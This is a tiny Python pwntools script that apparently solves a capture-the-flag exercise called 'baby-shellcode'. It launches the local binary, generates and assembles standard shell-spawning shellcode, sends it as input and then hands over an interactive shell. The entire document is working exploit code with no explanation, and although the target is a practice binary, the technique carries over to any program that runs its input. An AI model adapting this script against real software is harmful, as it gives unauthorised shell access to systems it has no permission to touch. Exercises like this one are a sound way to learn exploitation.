import pwn
from pwn import*

elf = context.binary = ELF("./baby-shellcode")
io = elf.process()

shellcode=pwn.shellcraft.sh()
shellcode=pwn.asm(shellcode)

io.sendline(shellcode)
io.interactive()
